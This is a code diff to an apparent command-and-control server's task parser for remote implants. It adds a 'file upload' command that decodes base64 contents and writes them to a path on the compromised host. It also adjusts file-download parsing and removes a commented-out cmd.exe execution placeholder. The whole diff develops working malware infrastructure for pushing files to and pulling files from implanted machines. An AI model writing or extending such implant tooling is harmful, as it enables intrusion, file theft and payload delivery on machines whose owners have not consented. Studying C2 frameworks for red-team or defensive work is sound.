@@ -1,3 +1,4 @@
+import base64
 from dataclasses import asdict, dataclass
 from enum import Enum
 
@@ -99,6 +100,7 @@ async def task_tree(command, args, implant_uuid):
                 StratList,
                 StratActive,
                 FileDownload,
+                FileUpload,
                 Exit,
             ]
             descriptions: list = get_description_of_dataclasses(dataclasses)
@@ -205,7 +207,11 @@ async def task_tree(command, args, implant_uuid):
 
         case "file":
             if args.startswith("download"):
-                file_path = args[9:]  # Extract file path after "download"
+                raw_args = args[9:]  # Extract file path after "download"
+                args_list = raw_args.split()
+                # The file path is the first argument after "download"
+                file_path = args_list[0]
+
                 try:
                     task = FileDownload(
                         implant_uuid=implant_uuid, file_path=file_path
@@ -213,11 +219,31 @@ async def task_tree(command, args, implant_uuid):
                     return (ResultType.TASK, task)
                 except ParseError as e:
                     return (ResultType.ERROR, str(e))
+
+            if args.startswith("upload"):
+                raw_args = args[7:]  # Extract file path after "upload"
+                args_list = raw_args.split()
+                # The file path is the first argument after "download"
+                file_path = args_list[0]
+                # The file contents is the second argument after "upload"
+                # replace " " with "" to remove any spaces that could be trailing/leading, which may cause problems with base64 decoding
+                file_contents = (args_list[1]).replace(" ", "")
+
+                try:
+                    task = FileUpload(
+                        implant_uuid=implant_uuid,
+                        file_path=file_path,
+                        file_contents=file_contents,
+                    ).to_task()
+                    return (ResultType.TASK, task)
+                except ParseError as e:
+                    return (ResultType.ERROR, str(e))
             else:
                 return (
                     ResultType.ERROR,
-                    "Invalid file command. Use `file download <file_path>`",
+                    "Invalid file command. Use `file upload <file_path>` or `file download <file_path>`",
                 )
+
         case "exit":
             try:
                 task = Exit(implant_uuid=implant_uuid).to_task()
@@ -255,36 +281,6 @@ def create_and_verify_task(implant_uuid: str, task: TaskDetail):
     t = Task(implant_uuid=implant_uuid, task=task)
     task_as_dict = asdict(t)
     return task_as_dict
-
-
-# @dataclass(frozen=True)
-# class Cmd:
-#     """
-#     [placeholder command for dev] Run a command on the host via cmd.exe
-#     """
-#     command_name = "sleep"
-
-#     implant_uuid: str
-#     cli: str
-
-#     def __post_init__(self):
-#         """Automatically run something when the dataclass is created."""
-#         if not self.cli:
-#             # Raise a ParseError exception if cli is None or empty
-#             raise ParseError(
-#                 "The 'cli' argument cannot be None or empty. Ex: `cmd <cli arg>`: `cmd whoami`"
-#             )
-
-#     def to_task(self) -> dict:
-#         """Convert the dataclass to a task style dictionary structure."""
-
-#         task_args = {"cli": self.cli}
-#         task_detail = TaskDetail(task_name=self.command_name, args=task_args)
-
-#         final_task = create_and_verify_task(
-#             implant_uuid=self.implant_uuid, task=task_detail
-#         )
-#         return final_task
 
 
 @dataclass(frozen=True)
@@ -484,6 +480,42 @@ class FileDownload:
 
 
 @dataclass(frozen=True)
+class FileUpload:
+    R"""
+    Upload a file to the host the implant is running on. Ex: `file upload C:\\Users\\user\\file.txt <base64 file contents>`
+    """
+
+    command_name = "file upload"
+    implant_uuid: str
+    file_path: str
+    file_contents: str  # start with base64. figure out the upload button later
+
+    def __post_init__(self):
+        """Automatically run something when the dataclass is created."""
+        if not self.file_path:
+            raise ParseError(
+                "The 'file_path' argument cannot be None or empty. Ex: `file upload <file_path>`: `file upload C:\\Users\\user\\file.txt`"
+            )
+        if not self.file_contents:
+            raise ParseError(
+                "The 'file_contents' argument cannot be None or empty. Ex: `file upload <file_path>`: `file upload C:\\Users\\user\\file.txt`"
+            )
+
+    def to_task(self) -> dict:
+        """Convert the dataclass to a task style dictionary structure."""
+        # convert from base64, to bytes, for easier CLI handling
+        bytes_file_contents = base64.b64decode(self.file_contents)
+
+        task_args = {"file_path": self.file_path, "file_contents": bytes_file_contents}
+        task_detail = TaskDetail(task_name=self.command_name, args=task_args)
+
+        final_task = create_and_verify_task(
+            implant_uuid=self.implant_uuid, task=task_detail
+        )
+        return final_task
+
+
+@dataclass(frozen=True)
 class Exit:
     R"""
     Exit the implant. This will kill the implant process on the host, don't expect a response back from the implant with this command.
@@ -523,7 +555,10 @@ class Ls:
             #     "The 'dir' argument cannot be None or empty. Ex: `ls <dir arg>`: `ls C:\\Users\\`"
             # )
             # instead of throwing a parse error, just list "." if no directory is provided, which is more intuitive for ls
-            self.directory = "."
+            # self.directory = "."
+            # because the dataclass is frozen, we have to use object.__setattr__ to set the directory value to "." if it's not provided
+            # kind of a hack, but it works for now. Keeps args protected as well.
+            object.__setattr__(self, "directory", ".")
 
     def to_task(self) -> dict:
         """Convert the dataclass to a task style dictionary structure."""
